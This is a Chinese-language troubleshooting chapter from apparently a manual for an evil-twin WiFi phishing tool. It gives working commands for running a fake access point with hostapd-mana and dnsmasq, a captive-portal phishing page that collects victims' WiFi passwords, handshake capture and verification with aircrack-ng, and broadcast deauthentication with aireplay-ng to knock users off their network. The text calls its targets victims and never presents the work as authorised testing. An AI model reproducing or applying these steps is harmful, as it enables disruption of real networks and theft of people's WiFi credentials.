# 第 7 章 常见问题排错（全部实测踩坑）

> 本章汇总本项目开发调试过程中**真实踩过的坑**与解决方案。每个问题都验证过。

## 7.1 点击开始攻击后找不到假 AP

**现象**：受害者手机搜索不到同名的无锁 WiFi。

**原因**：
1. 服务启动需要 10~15 秒（deauth + 切网卡 + 三件套）
2. 手机连着真实同名牌时，系统会把假 AP **合并显示**
3. 服务实际没起来

**解决**：
```bash
# 1. 确认服务真的起来了（控制台日志应显示 3/3 active）
systemctl is-active evil-dnsmasq evil-portal evil-hostapd

# 2. 确认真在广播
iw dev wlxYOUR_IFACE info | grep type        # 应为 AP
iw dev wlxYOUR_IFACE info | grep ssid        # 应为目标 SSID

# 3. 手机操作：断开 WiFi → 等 15 秒 → 重新搜索
```

## 7.2 连上假 AP 不自动跳转认证页

**现象**：连上假 AP 但浏览器不弹认证页，需要手动打开。

**原因**：系统 Captive Portal 检测机制。部分安卓机型对认证页只弹**下拉通知**（"此网络需要登录"），点通知才打开浏览器。

**解决**：
- 钓鱼页已对 `generate_204` / `gen_204` / `hotspot-detect` / `ncsi` / `success.txt` 返回 **302 跳转**（实测 5 个路径全通过）
- 安卓：下拉通知栏 → 点「此网络需要登录」
- iOS：会自动全屏弹出

> 这是系统安全限制：**网页无法强制打开浏览器**，能做到的极限就是让系统判定"需要登录"并弹通知/全屏页。

## 7.3 输入正确密码仍提示错误（重点）

**现象**：受害者输入 100% 正确的密码，钓鱼页仍报"密码错误"。

**根因（实测）**：验证用的 **hccapx 握手是无效数据**（旧握手 Master Key 全 0），aircrack-ng 对任何密码都返回 KEY NOT FOUND。

**排查三步**：
```bash
# 1. 看握手是否有效（用你确定正确的密码）
echo '正确密码' > /tmp/t.txt
aircrack-ng -w /tmp/t.txt -b <BSSID> <hccapx>
# → KEY FOUND = 有效；KEY NOT FOUND / Master Key 全 0 = 无效

# 2. 无效就重抓握手（第 3 章 3.3，deauth 自动触发）
sudo bash scripts/auto_capture_handshake.sh <BSSID> <CH> gf7e_new

# 3. 重抓后必须再验证一次 KEY FOUND，再更新 EVIL_HASHES
```

## 7.4 dnsmasq 报 "DHCP packet received on wlx... which has no address"

**原因**：假 AP 网卡**没配 IP**。hostapd 启动会自动切 AP 模式，但 DHCP 需要一个 IP 才能工作。

**解决**：hostapd 启动前先配地址（控制台已自动处理）：
```bash
sudo ip addr add 10.0.0.1/24 dev wlxYOUR_IFACE
```

## 7.5 53 端口被占用（systemd-resolved）

**现象**：dnsmasq 启动失败，日志显示端口被占用。

**原因**：Ubuntu 的 systemd-resolved 监听 53 端口。

**解决**：攻击时停掉，停止攻击后恢复（控制台已自动处理）：
```bash
sudo systemctl stop systemd-resolved
# ... 攻击结束 ...
sudo systemctl start systemd-resolved
```

## 7.6 控制台端口被占用

**现象**：8090 端口起不来。

**原因**：其他服务占用（实测香橙派监控占 820、有环境占 8090）。

**解决**：改端口，`config.env` 里 `EVIL_CTRL_PORT`，重启控制台。

## 7.7 网卡接口被禁用（INTERFACE-DISABLED）

**现象**：重复快速点击「开始攻击」，网卡变成 DISABLED。

**原因**：两个攻击线程抢同一块网卡（monitor/AP 模式互切打架）。

**解决**：
- 已加**并发锁**：攻击中忽略重复请求，前端按钮同步禁用
- 手动恢复：
```bash
sudo nmcli dev set wlxYOUR_IFACE managed yes
sudo ip link set wlxYOUR_IFACE up
```

## 7.8 hostapd 配置解析失败

**现象**：hostapd-mana 启动报配置行错误。

**原因（Windows 编辑过的文件）**：**CRLF 换行符**，Linux 程序不认 `\r`。

**解决**：
```bash
sudo sed -i 's/\r$//' /opt/evil-twin/evil_auto.conf
```

## 7.9 抓握手只抓到 M2 没有 M1

**现象**：`hcxpcapngtool` 报 `does not contain enough EAPOL M1 frames`。

**原因**：抓包窗口内客户端没有完整重连（M1 漏了）。

**解决**：用**广播 deauth**（`aireplay-ng -0 3 -a <BSSID>` 不指定客户端）主动踢人触发自动重连，配合 airodump 抓 140 秒、4 轮 deauth。见第 3 章 3.3。

## 7.10 扫描不到某个 WiFi

**现象**：控制台扫描结果里没有目标 WiFi。

**原因**：`iw scan` 单次扫描偶发漏检。

**解决**：控制台已做 4 轮合并去重 + 信号排序；多点几次扫描。或确认网卡是 managed 模式。

## 7.11 pkill 误杀自己

**现象**：`pkill -f portal.py` 把执行脚本的 bash 也杀了。

**解决**：精确匹配进程名而不是命令行：
```bash
pkill -x hostapd-mana
pkill -f '^python3.*portal'
```
不要用宽泛的 `pkill -f portal`。

## 7.12 systemd-run 服务秒退

**原因**：dnsmasq 用 systemd-run 启动时没加 `--no-daemon`（默认 fork 模式导致 systemd 认为已退出）。

**解决**：
```bash
systemd-run --unit=evil-dnsmasq --collect dnsmasq --no-daemon -C /opt/evil-twin/dnsmasq_auto.conf
```
